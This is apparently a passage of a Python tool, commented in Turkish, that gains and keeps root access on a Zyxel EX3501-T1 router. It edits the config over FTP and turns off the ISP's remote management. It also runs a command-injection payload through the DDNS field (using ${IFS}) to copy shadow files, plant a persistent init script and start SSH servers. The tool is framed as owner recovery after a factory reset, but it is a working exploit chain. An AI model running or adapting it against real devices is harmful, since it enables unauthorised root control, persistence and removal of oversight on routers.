            la["SupportedProtocols"] = ",".join(sup)
            diffs.append("LocalAccess SupportedProtocols -> +SSH,TELNET")

    # 4) RemoteManagement: tum yonetim servisleri LAN_ONLY (WAN'dan kapali)
    for svc in j.get("X_ZYXEL_RemoteManagement", {}).get("Service", []):
        name = svc.get("Name")
        if name in ("HTTP", "HTTPS", "FTP", "TELNET", "SSH", "SNMP", "PING"):
            if svc.get("Mode") != "LAN_ONLY" or not svc.get("Enable"):
                diffs.append("%s Service: Mode=%s Enable=%s -> LAN_ONLY+true" % (
                    name, svc.get("Mode"), svc.get("Enable")))
                svc["Mode"] = "LAN_ONLY"
                svc["Enable"] = True
            if svc.get("WANEnable"):
                svc["WANEnable"] = False
                diffs.append("%s WANEnable -> false" % name)

    # 5) TT / TR-069 RemoteAccess kapali
    ra = j.get("X_TTNET", {}).get("UserInterface", {}).get("RemoteAccess")
    if isinstance(ra, dict) and ra.get("Enable"):
        # Port/Protocol'u bosaltma — zcmd sema hatasi butun UserInterface'i
        # (LocalAccess dahil) boot'ta geri alabiliyor. Sadece Enable=false.
        ra["Enable"] = False
        diffs.append("X_TTNET.UserInterface.RemoteAccess Enable -> false")
    ura = j.get("UserInterface", {}).get("RemoteAccess")
    if isinstance(ura, dict) and ura.get("Enable"):
        ura["Enable"] = False
        diffs.append("UserInterface.RemoteAccess Enable -> false")
    for u in j.get("X_TTNET", {}).get("Users", {}).get("User", []):
        if u.get("RemoteAccessCapable"):
            u["RemoteAccessCapable"] = False
            diffs.append("TTNET user %s RemoteAccessCapable -> false" % u.get("Username"))

    # 6) ISP TR-069 / CWMP kapat (ACS artik baglanamaz)
    ms = j.get("ManagementServer")
    if isinstance(ms, dict):
        for key in ("EnableCWMP", "PeriodicInformEnable", "STUNEnable",
                    "X_ZYXEL_Supplemental_EnableCWMP"):
            if ms.get(key):
                ms[key] = False
                diffs.append("ManagementServer.%s -> false" % key)

    # 7) ACS / TR111 Management static route kapat (silme — dizi indeksi bozulmasin)
    acs_ips = _acs_ips(j)
    for router in j.get("Routing", {}).get("Router", []) or []:
        for rt in router.get("IPv4Forwarding", []) or []:
            if not rt.get("Enable"):
                continue
            if _is_acs_mgmt_route(rt, acs_ips):
                rt["Enable"] = False
                diffs.append("route %s %s/%s Enable -> false" % (
                    rt.get("Alias") or "?",
                    rt.get("DestIPAddress") or "",
                    rt.get("DestSubnetMask") or ""))

    return diffs


def _ip_int(s):
    try:
        a, b, c, d = [int(x) for x in (s or "").split(".")]
        return (a << 24) | (b << 16) | (c << 8) | d
    except Exception:
        return None


def _subnet_covers(dest, mask, ip):
    di, mi, ii = _ip_int(dest), _ip_int(mask), _ip_int(ip)
    if None in (di, mi, ii):
        return False
    return (di & mi) == (ii & mi)


def _acs_ips(j):
    ips = set()
    ms = j.get("ManagementServer") or {}
    for k in ("X_TTNET_ACS_IP", "X_TTNET_ACS_IP_ETH"):
        v = ms.get(k)
        if v:
            ips.add(v)
    return ips


def _is_acs_mgmt_route(rt, acs_ips):
    alias = (rt.get("Alias") or "").upper()
    dest = rt.get("DestIPAddress") or ""
    mask = rt.get("DestSubnetMask") or ""
    if alias == "TR111":
        return True
    if dest in acs_ips:
        return True
    return any(_subnet_covers(dest, mask, ip) for ip in acs_ips)


def _root_account(j):
    for gp in j.get("X_ZYXEL_LoginCfg", {}).get("LogGp", []):
        for acc in gp.get("Account", []):
            if acc.get("Username") == "root":
                return acc
    return {}


def _tt_user(j, name):
    for u in j.get("X_TTNET", {}).get("Users", {}).get("User", []):
        if u.get("Username") == name:
            return u
    return {}


def config_critical_ok(j, root_pw=None):
    """Kanitlanmis yol: root enable + shadow + LocalAccess 22/SSH.
    CWMP/WAN kapatma buraya GIRMEZ — onlar yapisirsa iyi, yapismazsa
    rollback yapip root'u da geri almak yanlis."""
    acc = _root_account(j)
    root_ok = bool(acc.get("Enabled")) and (acc.get("shadow") or "").startswith("root:$6$")
    if root_pw and root_ok:
        root_ok = shadow_matches(acc.get("shadow"), root_pw)
    tt = _tt_user(j, "root")
    tt_ok = bool(tt.get("Enable")) and "SSH" in (tt.get("Allowed_LA_Protocols") or "")
    la = j.get("X_TTNET", {}).get("UserInterface", {}).get("LocalAccess", {}) or {}
    ports = [p.strip() for p in (la.get("Port") or "").split(",") if p.strip()]
    protos = [p.strip() for p in (la.get("Protocol") or "").split(",") if p.strip()]
    la_ok = "22" in ports and "SSH" in protos
    return root_ok and tt_ok and la_ok


def config_hardening_report(j):
    """Best-effort kapatmalar; basarisizlik rollback sebebi degil."""
    missing = []
    ms = j.get("ManagementServer") or {}
    if ms.get("EnableCWMP", False):
        missing.append("EnableCWMP hâlâ true")
    if ms.get("PeriodicInformEnable", False):
        missing.append("PeriodicInformEnable hâlâ true")
    if ms.get("STUNEnable", False):
        missing.append("STUNEnable hâlâ true")
    ra = (j.get("X_TTNET") or {}).get("UserInterface", {}).get("RemoteAccess") or {}
    if ra.get("Enable", False):
        missing.append("RemoteAccess Enable hâlâ true")
    acs_ips = _acs_ips(j)
    for router in j.get("Routing", {}).get("Router", []) or []:
        for rt in router.get("IPv4Forwarding", []) or []:
            if rt.get("Enable") and _is_acs_mgmt_route(rt, acs_ips):
                missing.append("ACS route %s hâlâ Enable" % (rt.get("Alias") or rt.get("DestIPAddress")))
    return missing


def config_state_ok(j, root_pw=None):
    """Geriye donuk: sadece kritik yol (hardening buraya dahil degil)."""
    return config_critical_ok(j, root_pw)




# --------------------------------------------------------------------------
# Asamalar
# --------------------------------------------------------------------------

def install_persist_via_ftp(ip, user, pw):
    """S99zyroot'u overlay'e FTP ile yaz. Telnet quoting'e bagimli degil."""
    want_md5 = hashlib.md5(INIT_SCRIPT_SH.encode()).hexdigest()
    try:
        ftp = ftp_connect(ip, user, pw)
    except Exception as e:
        vlog("persist FTP login: %s" % e)
        return False
    try:
        try:
            cur = ftp_read(ftp, "/etc/init.d/S99zyroot")
            if hashlib.md5(cur).hexdigest() == want_md5:
                log("[i] S99zyroot zaten kurulu (md5 eslesti, FTP).")
                return True
        except Exception:
            pass
        ftp_write(ftp, "/etc/init.d/S99zyroot", INIT_SCRIPT_SH.encode())
        try:
            ftp_write(ftp, "/etc/rc.d/S99zyroot", INIT_SCRIPT_SH.encode())
        except Exception as e:
            vlog("rc.d STOR: %s" % e)
        back = ftp_read(ftp, "/etc/init.d/S99zyroot")
        ok = hashlib.md5(back).hexdigest() == want_md5
        if ok:
            log("[+] /etc/init.d/S99zyroot FTP ile yazildi ve md5 dogrulandi")
        else:
            log("[!] S99zyroot FTP yazildi ama md5 uyusmadi")
        return ok
    except Exception as e:
        log("[!] S99zyroot FTP yazimi: %s" % e)
        return False
    finally:
        try:
            ftp.quit()
        except Exception:
            pass


def install_persist_via_telnet(t):
    b64 = base64.b64encode(INIT_SCRIPT_SH.encode()).decode()
    want_md5 = hashlib.md5(INIT_SCRIPT_SH.encode()).hexdigest()
    cmds = [": > /tmp/s99.b64"]
    for k in range(0, len(b64), 200):
        cmds.append("echo %s >> /tmp/s99.b64" % b64[k:k + 200])
    cmds += ["openssl base64 -d -in /tmp/s99.b64 > /etc/init.d/S99zyroot",
             "rm -f /tmp/s99.b64",
             "chmod 755 /etc/init.d/S99zyroot",
             "ln -sf /etc/init.d/S99zyroot /etc/rc.d/S99zyroot 2>/dev/null || "
             "cp /etc/init.d/S99zyroot /etc/rc.d/S99zyroot; chmod 755 /etc/rc.d/S99zyroot"]
    for c in cmds:
        t.cmd(c, 1.2)
    exact = t.cmd("md5sum /etc/init.d/S99zyroot 2>/dev/null")
    if want_md5 in exact:
        log("[+] /etc/init.d/S99zyroot telnet ile kuruldu (md5 OK)")
        return True
    log("[!] S99zyroot telnet md5 uyusmadi: %s" % exact[-200:])
    return False


def ssh_id(ip, root_pw, port=22):
    """exec_command stok dropbear'da segfault; interactive pty calisir."""
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(ip, port, username="root", password=root_pw, timeout=15,
              allow_agent=False, look_for_keys=False)
    try:
        ch = c.invoke_shell(term="vt100", width=80, height=24)
        time.sleep(0.8)
        if ch.recv_ready():
            ch.recv(8192)
        ch.send("id\n")
        time.sleep(1.0)
        buf = b""
        t0 = time.time()
        while time.time() - t0 < 4:
            if ch.recv_ready():
                buf += ch.recv(8192)
                if b"uid=" in buf:
                    break
            time.sleep(0.2)
        return buf.decode(errors="replace")
    finally:
        c.close()


def make_var_shadow(root_pw, existing=""):
    line = make_shadow_line(root_pw).rstrip("\n")
    if existing:
        lines, found = [], False
        for ln in existing.splitlines():
            if ln.startswith("root:"):
                lines.append(line)
                found = True
            else:
                lines.append(ln)
        if not found:
            lines.insert(0, line)
        return "\n".join(lines) + "\n"
    return (
        line + "\n"
        "daemon:*:0:0:99999:7:::\n"
        "ubus:x:0:0:99999:7:::\n"
        "nobody:x:0:0:99999:7:::\n"
    )


def ftp_stage_persist_files(ftp, root_pw):
    """Admin FTP yalnizca /data'ya yazar. init.d'ye DDNS tasiyacak."""
    ftp_write(ftp, "/data/S99zyroot", INIT_SCRIPT_SH.encode())
    ftp_write(ftp, "/data/zy_passwd", PASSWD_CONTENT.encode())
    existing = ""
    try:
        existing = ftp_read(ftp, "/var/shadow").decode(errors="replace")
        vlog("FTP /var/shadow okundu (%d byte)" % len(existing))
    except Exception as e:
        vlog("FTP /var/shadow okunamadi: %s" % e)
    ftp_write(ftp, "/data/zy_shadow", make_var_shadow(root_pw, existing).encode())
    back = ftp_read(ftp, "/data/S99zyroot")
    if hashlib.md5(back).digest() != hashlib.md5(INIT_SCRIPT_SH.encode()).digest():
        raise RuntimeError("/data/S99zyroot FTP round-trip md5 uyusmadi")
    log("[+] /data/S99zyroot + zy_passwd + zy_shadow yazildi")


def ddns_install_initd(ip, admin_user, admin_pass, ftp, root_pw):
    """FTP /data staging -> DDNS root cp /etc/init.d + calistir."""
    if not HAVE_CRYPTO:
        sys.exit("DDNS icin pycryptodome sart. venv bootstrap calismadi.")
    s = WebSession(ip, admin_user, admin_pass)

    # /var/shadow FTP ile gelmediyse DDNS ile /data'ya kopyala, yama, geri yaz
    try:
        sh = ftp_read(ftp, "/data/zy_shadow").decode(errors="replace")
        have_hash = shadow_matches(sh, root_pw)
    except Exception:
        have_hash = False
    if not have_hash:
        log("[*] /var/shadow DDNS ile /data'ya aliniyor")
        s.ddns_inject("foo;cp${IFS}/var/shadow${IFS}/data/var_shadow_orig;", wait=10)
        try:
            orig = ftp_read(ftp, "/data/var_shadow_orig").decode(errors="replace")
            ftp_write(ftp, "/data/zy_shadow", make_var_shadow(root_pw, orig).encode())
            log("[+] /data/zy_shadow guncellendi (mevcut shadow + yeni root hash)")
        except Exception as e:
            log("[!] shadow orig okunamadi (%s) — sadece root satiri yazilacak" % e)

    # Kanit /tmp/zys99 — FTP LIST gorur; kisa/yasak isimler 553 verir.
    steps = [
        ("init.d + marker",
         "http://example.com/upd;cp${IFS}/data/S99zyroot${IFS}/etc/init.d/S99zyroot;"
         "chmod${IFS}755${IFS}/etc/init.d/S99zyroot;"
         "cp${IFS}/data/S99zyroot${IFS}/etc/rc.d/S99zyroot;"
         "touch${IFS}/tmp/zys99;"),
        ("passwd+shadow /var",
         "http://example.com/upd;cp${IFS}/data/zy_passwd${IFS}/var/passwd;"
         "cp${IFS}/data/zy_shadow${IFS}/var/shadow;"),
        ("S99 + dropbear 2222",
         "http://example.com/upd ; /bin/sh /etc/init.d/S99zyroot ; /usr/sbin/dropbear -p 2222 -E ;"),
    ]
    for title, payload in steps:
        log("[*] DDNS: %s" % title)
        try:
            s.ddns_inject(payload, wait=12)
        except Exception as e:
            log("[!] DDNS %s: %s" % (title, e))
        try:
            st = s.get("/cgi-bin/DAL?oid=ddns")
            obj = (st.get("Object") or [{}])[0] if isinstance(st, dict) else {}
            vlog("ddns Enable=%s IP=%s Time=%s Auth=%s" % (
                obj.get("Enable"), obj.get("DynamicIP"),
                obj.get("UpdatedTime"), obj.get("AuthenticationResult")))
        except Exception as e:
            vlog("ddns GET: %s" % e)
    try:
        s.ddns_disable()
    except Exception:
        pass

    ok = False
    try:
        lines = []
        ftp.retrlines("LIST /tmp", lines.append)
        names = [ln.split()[-1] for ln in lines]
        vlog("/tmp entries=%d" % len(names))
        if "zys99" in names:
            log("[+] DDNS kanit: /tmp/zys99 var (init.d kopyasi calisti)")
            ok = True
        else:
            log("[!] /tmp/zys99 yok — ez-ipupdate URL'yi komut olarak calistirmadi")
            log("    (UpdatedTime guncellenir, Auth=Not Accepted, DynamicIP=0.0.0.0)")
    except Exception as e:
        log("[!] /tmp LIST: %s" % e)
    return ok


def ask(msg, default=None, hidden=False):
    if hidden:
        import getpass
        v = getpass.getpass(msg + ("" if default is None else " [%s]: " % default) if default is not None else msg + ": ")
    else:
        d = "" if default is None else " [%s]" % default
        v = input(msg + d + ": ").strip()
    if not v and default is not None:
        return default
    return v


def main():
    ap = argparse.ArgumentParser(description="EX3501-T1 root geri kazanim (fabrika reseti sonrasi)")
    ap.add_argument("--ip", default=os.environ.get("EX3501_IP"))
    ap.add_argument("--admin-user", default=os.environ.get("EX3501_ADMIN_USER"))
    ap.add_argument("--admin-pass", default=os.environ.get("EX3501_ADMIN_PASS"))
    ap.add_argument("--root-pass", default=os.environ.get("EX3501_ROOT_PASS"))
    ap.add_argument("--yes", action="store_true", help="onay sormadan devam et")
    ap.add_argument("--verbose", "-v", action="store_true",
                    help="FTP/web/port adimlarini ayrintili yaz")
    ap.add_argument("--self-test", action="store_true", help="hash oz-testi ve cik")
    ap.add_argument("--no-venv", action="store_true",
                    help="otomatik venv/pip bootstrap'i atla (paketler global olmali)")
    args = ap.parse_args()

    global VERBOSE
    VERBOSE = bool(args.verbose)
    if VERBOSE:
        log("[i] verbose acik | python=%s | crypto=%s | paramiko=%s" % (
            sys.executable, HAVE_CRYPTO, HAVE_PARAMIKO))

    print(__doc__.splitlines()[2])
    self_test()
    if args.self_test:
        return

    # Tum kimlik bilgileri CLI'dan geldiyse veya stdin TTY degilse onay sorma.
    # Aksi halde `input()` EOFError ile "bozuk script" gibi patlar.
    if not args.yes:
        creds_from_cli = all([args.ip, args.admin_user, args.admin_pass, args.root_pass])
        if creds_from_cli or not sys.stdin.isatty():
            args.yes = True
            vlog("otomatik --yes (cli creds=%s, isatty=%s)" % (
                creds_from_cli, sys.stdin.isatty()))

    # ---- Bilgi toplama (interaktif veya argumanlarla) ----
    ip = args.ip or ask("Router IP adresi", "192.168.1.1")
    admin_user = args.admin_user or ask("Admin kullanicisi (web/FTP)", "admin")
    admin_pass = args.admin_pass or ask("Admin sifresi (web/FTP — genelde cihaz etiketinde)", hidden=True)
    if not admin_pass:
        sys.exit("Admin sifresi zorunlu.")
    if args.root_pass:
        root_pw = args.root_pass
    else:
        root_pw = ask("Yeni root sifresi (bos birakirsan rastgele uretilir)", hidden=True)
        if not root_pw:
            root_pw = "".join(secrets.choice(
                string.ascii_letters + string.digits) for _ in range(16))
            print("[i] Uretilen root sifresi: %s  (not alin!)" % root_pw)
    if len(root_pw) < 6:
        sys.exit("Root sifresi en az 6 karakter olmali.")

    log("\nHedef : http://%s  (admin: %s)" % (ip, admin_user))
    log("Root sifresi: %s%s" % ("*" * len(root_pw), " (%d karakter)" % len(root_pw)))
    if not args.yes:
        try:
            r = input("\nDevam? Config degisecek ve cihaz REBOOT edecek. [y/N] ").strip().lower()
        except EOFError:
            sys.exit("Iptal edildi (stdin kapali; --yes verin).")
        if r != "y":
            sys.exit("Iptal edildi.")

    # ---- 1) FTP ----
    banner("[1/4] FTP: yedek + staging")
    ensure_ftp(ip, admin_user, admin_pass)
    try:
        ftp = ftp_connect(ip, admin_user, admin_pass)
    except Exception as e:
        sys.exit("FTP girisi basarisiz (%s). Admin sifresini kontrol edin." % e)
    log("[+] FTP girisi OK")

    try:
        raw = ftp_read(ftp, CONFIG_PATH)
    except Exception as e:
        sys.exit("Config indirilemedi: %s" % e)
    stamp = time.strftime("%Y%m%d-%H%M%S")
    local_bak = "zcfg_config.backup-%s.json" % stamp
    with open(local_bak, "wb") as f:
        f.write(raw)
    log("[+] Yedek (yerel): %s (%d byte)" % (local_bak, len(raw)))
    try:
        ftp.storbinary("STOR /data/zcfg_config.backup-%s.json" % stamp,
                       io.BytesIO(raw))
        log("[+] Yedek (cihaz): /data/zcfg_config.backup-%s.json" % stamp)
    except Exception as e:
        log("[!] Cihaza yedek yazilamadi (sorun degil): %s" % e)

    try:
        ftp_stage_persist_files(ftp, root_pw)
    except Exception as e:
        log("[!] /data staging: %s (telnet ile de yazilir)" % e)

    try:
        j = json.loads(raw.decode("utf-8", errors="replace"))
    except Exception as e:
        sys.exit("Config JSON cozulemedi: %s" % e)

    # ---- 2) Yamala + yukle. FTP'den sonra DAL YOK. ----
    banner("[2/4] Config yama (26+32) + FTP STOR")
    need_reboot = True
    if config_critical_ok(j, root_pw):
        log("[i] Config zaten istenen durumda — reboot atlanacak.")
        need_reboot = False
    else:
        diffs = apply_proven_edits(j, root_pw)
        for d in diffs:
            log("  * %s" % d)
        new_raw = json.dumps(j, ensure_ascii=False, indent=2).encode()
        vlog("dump %d byte (eski %d)" % (len(new_raw), len(raw)))
        ftp_write(ftp, CONFIG_PATH, new_raw)
        time.sleep(2)
        back = json.loads(ftp_read(ftp, CONFIG_PATH).decode("utf-8", errors="replace"))
        if not config_critical_ok(back, root_pw):
            ftp_write(ftp, CONFIG_PATH, raw)
            sys.exit("Yukleme dogrulanamadi, yedek geri yazildi.")
        log("[+] Config yazildi. HEMEN reboot — araya DAL koyma.")
    ftp.quit()

    # ---- 3) Reboot ----
    banner("[3/4] Reboot")
    if need_reboot:
        if HAVE_CRYPTO:
            try:
                r = web_reboot(ip, admin_user, admin_pass)
                log("[+] POST /cgi-bin/Reboot: %s" % str(r)[:120])
            except Exception as e:
                log("[!] Web reboot: %s" % e)
                manual_reboot_prompt()
        else:
            manual_reboot_prompt()
        t0 = time.time()
        while time.time() - t0 < 30 and port_open(ip, 80):
            time.sleep(2)
        if not wait_port(ip, 80, 420):
            sys.exit("Web geri gelmedi.")
        log("[+] web acildi")
    else:
        log("[i] Reboot gerekmedi.")

    # ---- 4) passwd + telnet persist ----
    banner("[4/4] /var/passwd + S99zyroot (telnet cp)")
    if not wait_port(ip, 21, 120):
        sys.exit("FTP geri gelmedi.")
    ftp = ftp_connect(ip, admin_user, admin_pass)
    try:
        post_j = json.loads(ftp_read(ftp, CONFIG_PATH).decode("utf-8", errors="replace"))
    except Exception as e:
        sys.exit("Reboot sonrasi config okunamadi: %s" % e)
    if not config_critical_ok(post_j, root_pw):
        ftp.quit()
        sys.exit(
            "Reboot sonrasi yama yok (LocalAccess/root). "
            "FTP'den sonra DAL calistirilmis veya ACS config'i basmis olabilir.")
    log("[+] Reboot sonrasi yama duruyor")
    la = post_j["X_TTNET"]["UserInterface"]["LocalAccess"]
    vlog("LocalAccess %s" % la)
    try:
        ftp_write(ftp, "/var/passwd", PASSWD_CONTENT.encode())
        log("[+] /var/passwd root -> /bin/sh")
    except Exception as e:
        log("[!] passwd: %s" % e)
    ftp.quit()

    if not wait_port(ip, 23, 90):
        sys.exit("Telnet (23) acilmadi — LocalAccess uygulanmamis.")
    t = TelnetRoot(ip, root_pw)
    out = t.cmd("id")
    vlog("telnet id %r" % out[-200:])
    if "uid=0" not in out:
        t.close()
        sys.exit("Telnet var ama uid=0 yok: %r" % out[-200:])
    log("[+] Telnet root uid=0")
    for c in (
        "cp /data/S99zyroot /etc/init.d/S99zyroot",
        "chmod 755 /etc/init.d/S99zyroot",
        "cp /data/S99zyroot /etc/rc.d/S99zyroot",
        "chmod 755 /etc/rc.d/S99zyroot",
        "killall dropbear 2>/dev/null; sleep 1; "
        "/usr/sbin/dropbear -p 22 -P /var/run/dropbear.pid -E; "
        "/usr/sbin/dropbear -p 2222 -P /var/run/dropbear2222.pid -E",
    ):
        vlog(t.cmd(c, 1.8)[-120:])
    lsout = t.cmd("ls -la /etc/init.d/S99zyroot /etc/rc.d/S99zyroot 2>&1", 1.5)
    t.close()
    persist_ok = "S99zyroot" in lsout and "No such" not in lsout
    if persist_ok:
        log("[+] /etc/init.d/S99zyroot overlay'de")
    else:
        sys.exit("S99zyroot yazilamadi:\n" + lsout[-300:])

    ssh_ok = False
    time.sleep(2)
    if HAVE_PARAMIKO and port_open(ip, 22):
        try:
            res = ssh_id(ip, root_pw, 22)
            if "uid=0" in res:
                log("[+] SSH :22 interactive uid=0")
                ssh_ok = True
            else:
                log("[!] SSH baglandi ama uid yok (exec segfault normal; interactive dene)")
        except Exception as e:
            log("[!] SSH :22 %s" % e)
    elif port_open(ip, 22):
        log("[+] SSH (22) acik (paramiko yok)")
        ssh_ok = True

    banner("TAMAMLANDI")
    print("  Telnet : telnet %s   (root / sectiginiz sifre)" % ip)
    print("  SSH    : ssh root@%s   (interactive; exec_command segfault)" % ip)
    print("  Kalici : /etc/init.d/S99zyroot")
    print("  Yedek  : %s" % local_bak)
    if not ssh_ok:
        print("  Not    : SSH dogrulanamadi; telnet root acik.")


def manual_reboot_prompt():
    print("=" * 50)
    print("  Cihazi elle yeniden baslatin:")
    print("  1. Modemin guc kablosunu cekin")
    print("  2. 5 sn bekleyin, tekrar takin")
    print("  3. Web arayuzu acilana kadar bekleyin (~1-2 dk)")
    if sys.stdin.isatty():
        try:
            input("  Hazir olunca Enter'a basin...")
        except EOFError:
            log("  [i] stdin kapali — 20 sn bekleniyor...")
            time.sleep(20)
    else:
        log("  [i] TTY yok — 20 sn bekleniyor, sonra port izlenecek.")
        time.sleep(20)
    print("=" * 50)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit("\nIptal edildi.")
    except EOFError:
        sys.exit("\nIptal edildi (stdin kapali). --yes ile tekrar deneyin.")
